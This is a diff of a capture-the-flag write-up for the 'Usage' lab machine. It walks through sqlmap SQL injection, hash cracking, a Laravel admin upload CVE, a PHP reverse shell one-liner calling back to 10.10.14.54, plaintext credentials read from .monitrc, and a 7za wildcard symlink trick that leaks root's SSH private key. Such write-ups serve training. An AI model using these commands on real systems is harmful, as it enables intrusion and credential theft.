@@ -14,7 +14,7 @@ Enumeration
 As usual for an easy box, I set up a basic scan of the IP
 nmap -sC -sV 10.10.11.18
 
-[pic link] -nmap results
+![nmap results](/assets/images/usage1.png)
 
 Looks like we have ports open for ssh and http. It gives us the host name, so we can add this to /etc/hosts to access the page. This is pretty typical, but I like to set up a more detailed scan to run in the background while I check out the webpage. I'll try to run directory busting too, to cover my bases.
 
@@ -24,7 +24,8 @@ nmap -sC -sV -p- A usage.htb
 dirb http://usage.htb/ /usr/share/wordlists/dirb/common.txt
 dirb http://admin.usage.htb/ /usr/share/wordlists/dirb/common.txt
 
-[pic link] -
+[pic link] -dirb results base
+[pic link] -drib results admin
 
 While that's running, I can check out the web page. Landing page is a login form. There are also links to "Register" and "Admin". "Admin" gives us a subdomain that we can add. 
 
@@ -68,6 +69,7 @@ Which breaks down into the following:
 
 And got 3 databases:
 [pic link] - sqlmap results
+[pic link] - sqlmap db type
 
 I then ran the following to get the tables and dump the info of admin_users, adding in the DB type to make it run a little faster. 
 
@@ -75,7 +77,7 @@ sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D us
 sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog -T admin_users --dump
 
 which yielded a nice hash for admin.
-
+[pic link] - sqlmap tables
 [pic link -] sqlmap hash
 
 I then used https://hashes.com/en/tools/hash_identifier to identify the hash as bcrypt, and dropped it into a text file with vim. Hashcat gets put into work next and quickly yields admin:whatever1. Good ol' rockyou!
@@ -84,7 +86,7 @@ hashcat -m 3200 -a 0 adminhash.txt /usr/share/wordlists/rockyou.txt.gz
 
 [pic link] - hashcat output
 
-Worth trying over ssh, but no dice. The webpage works though, and takes us to the dashboard. The dashboard immediately gives some information, including the version of laravel I was missing earlier- 10.18.0.
+Worth trying over ssh, but no dice. The admin page works though, and takes us to the dashboard. The dashboard immediately gives some information, including the version of laravel I was missing earlier- 10.18.0.
 
 I spent some time playing around with the other pages, trying to add a new user, change paths in the permission section, messing with the search field, all to no avail. I finally circled back to the laravel version number and found CVE-2023-24249 along with a proof of concept here:
 https://flyd.uk/post/cve-2023-24249/. 
@@ -105,6 +107,101 @@ ifconfig
 nc -nvlp 8001
 php -r '$sock=fsockopen("10.10.14.54",8001);exec("sh<&3>&3 2>&3");'
 
-and I finally catch a shell!
+and I finally catch a shell! We can even get the user flag from here.
 
 [pic link ] - reverse shell
+
+cd ~ 
+cat user.txt
+
+The box has python so we can upgrade our shell
+
+python3 --version
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+This was my least favorite part. I spent a decent amount of time looking around the box, trying to find something useful. I can see another user, "xander", but can't access their directory. I found plaintext database credentials in /var/www/html/project_admin/.env
+
+[pic link] -db credential
+
+But this just gives access to the mysql db I was in earlier, and the password hasn't been reused for xander, root, or admin. My search was primarily through the /var/www/html, hoping to find some type of password reuse. It wasn't until (much later) that I returned to the home directory and looked for hidden files that I finally hit paydirt. It appears there is a monitoring utility that needs some plaintext passwords to run.
+
+ls -al
+
+[pic link] -home hidden files
+
+cat .monitrc
+
+[pic link] - hidden password
+
+Luckily, this password is reused, and I can ssh to xander. 
+
+ssh xander@10.10.11.18
+
+[pic link] - xander ssh access
+
+And now I can start down my privilege escalation checklist. Almost immediately I find something interesting. 
+
+sudo -l
+
+[pic link] -sudo -l results
+
+Given that the name of the box is "Usage", I'm gonna prioritize this binary. Diving right in, I see that it givecs three options - project backup, backup MySQL data, reset admin password.
+
+cd /usr/bin
+sudo usage_management
+
+
+3 looks like fun, so I start there, but I don't get to choose what it resets to, or get any insight into what it changes to. Since it's unlikely to reset the root password anyway, I keep it moving. 2 doesn't print out anything useful either, but 1 has some output as it runs. 
+
+[pic link] -sudo usage_management
+
+It looks from the output like it uses 7-zip to open /var/backups/project.zip and update it. Checking out this directory, I have read access, but not write, so I won't be able to manipulate the zip file to try to take advantage of the program in any way. Same goes for the actual 7-zip binary. I spend a while trying to manipulate the path to make it open my own zip file, or to make my own usage_management run, but I only succeed in royally messing up my path. I even look at gtfo bins for 7z, but since I can't run the command as sudo directly, its not helpful. 
+
+Finally, I get smart enough to run strings.
+
+strings usage_management
+
+[pic link] -strings output
+
+With strings, I can see a little better how 7za is being used. Specifically: 
+
+/usr/bin/7za: calls executable
+a : add
+/var/backups/project.zip: add to this file
+-tzip: type of archive, in this case, zip
+-snl: store symbolic links as links, instead of storing the file the link points to 
+-mmt: allows multiple threads
+-- : end of command options. All strings after this are treated as arguments, not options
+* : wildcard to grab all files in the directory
+
+I know wildcards are great for privesc attempts like this one, so after extensive googling I finaly got a couple good resources that explain a file read attack using 7z:
+https://0xdf.gitlab.io/2019/07/20/htb-ctf.html
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
+
+From what I understand, if you have write permissions to the folder 7z targets (/var/www/html), you can create a symbolic link to a file and generate an intended failure within 7z that dumps the file you linked to. It works because when 7z sees "@", it wants to read the contents of that file as a list of files to zip. So- 7z runs, grabbing everything in /var/www/html (thanks to the wildcard), sees @root.txt, follows the link we created to the real root.txt, and throws an error (dumping info) because it doesn't find a list. 
+
+Now, I could grab root.txt directly, but I would rather go full escalation and grab the ssh key instead. 
+
+cd /var/www/html
+touch @id_rsa
+ln -s /root/.ssh/id_rsa id_rsa
+sudo /usr/bin/usage_management
+
+[pic link] - ssh root key
+
+Bingo! I just copy into a .pem file and format correctly, then change the permissions. 
+
+chmod 600 sshkey.pem
+ssh -i sshkey.pem root@10.10.11.18
+
+and we have root!
+
+
+
+I spent a little while enjoying my root privileges by exploring the privesc exploit. Despite what hacktricks says about the importance of the options, I was able to get the error for the file leak without any of the command options. It appears the wildcard enabling the reading of "@file" was enough, suggesting this exploit might be viable in a wider set of circumstances than I originally thought. A good trick to keep in the back pocket!
+
+[pic link] - no options
+
+I also found the script responsible for driving me crazy during the file upload attack portion. It says it only runs every 3 minutes, but I was finding my files cleared out much more often. Annoying.
+
+[pic link] - cleanup.sh
